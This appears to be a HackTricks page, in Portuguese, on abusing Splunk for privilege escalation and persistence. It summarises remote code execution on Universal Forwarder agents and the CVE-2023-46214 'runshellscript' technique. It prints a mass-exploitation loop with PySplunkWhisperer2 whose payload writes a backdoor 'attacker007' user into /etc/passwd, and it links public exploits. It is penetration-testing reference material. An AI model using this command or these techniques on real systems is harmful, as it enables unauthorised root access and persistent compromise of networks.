# Splunk LPE and Persistence

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Se **enumerando** uma máquina **internamente** ou **externamente** você encontrar o **Splunk em execução** (porta 8090), se você tiver **sorte de saber** quaisquer **credenciais válidas** você pode **abusar do serviço Splunk** para **executar um shell** como o usuário que está executando o Splunk. Se estiver rodando como root, você pode escalar privilégios para root.

Também, se você já é **root e o serviço Splunk não está ouvindo apenas em localhost**, você pode **roubar** o **arquivo de senhas** do serviço Splunk e **quebrar** as senhas, ou **adicionar novas** credenciais a ele. E manter persistência no host.

Na primeira imagem abaixo você pode ver como se parece uma página da web do Splunkd.



## Resumo da Exploração do Agente Splunk Universal Forwarder

**Para mais detalhes, confira o post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)**

**Visão Geral da Exploração:**
Uma exploração visando o Agente Splunk Universal Forwarder (UF) permite que atacantes com a senha do agente executem código arbitrário em sistemas que executam o agente, comprometendo potencialmente toda uma rede.

**Pontos Chave:**
- O agente UF não valida conexões de entrada ou a autenticidade do código, tornando-o vulnerável à execução de código não autorizado.
- Métodos comuns de aquisição de senhas incluem localizá-las em diretórios de rede, compartilhamentos de arquivos ou documentação interna.
- A exploração bem-sucedida pode levar a acesso de nível SYSTEM ou root em hosts comprometidos, exfiltração de dados e infiltração adicional na rede.

**Execução da Exploração:**
1. Atacante obtém a senha do agente UF.
2. Utiliza a API do Splunk para enviar comandos ou scripts para os agentes.
3. Ações possíveis incluem extração de arquivos, manipulação de contas de usuário e comprometimento do sistema.

**Impacto:**
- Comprometimento total da rede com permissões de nível SYSTEM/root em cada host.
- Potencial para desativar o registro para evitar detecção.
- Instalação de backdoors ou ransomware.

**Comando de Exemplo para Exploração:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits públicos utilizáveis:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Abusando de Consultas no Splunk

**Para mais detalhes, consulte o post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

O **CVE-2023-46214** permitia o upload de um script arbitrário para **`$SPLUNK_HOME/bin/scripts`** e então explicava que usando a consulta de pesquisa **`|runshellscript script_name.sh`** era possível **executar** o **script** armazenado lá.


<details>

<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
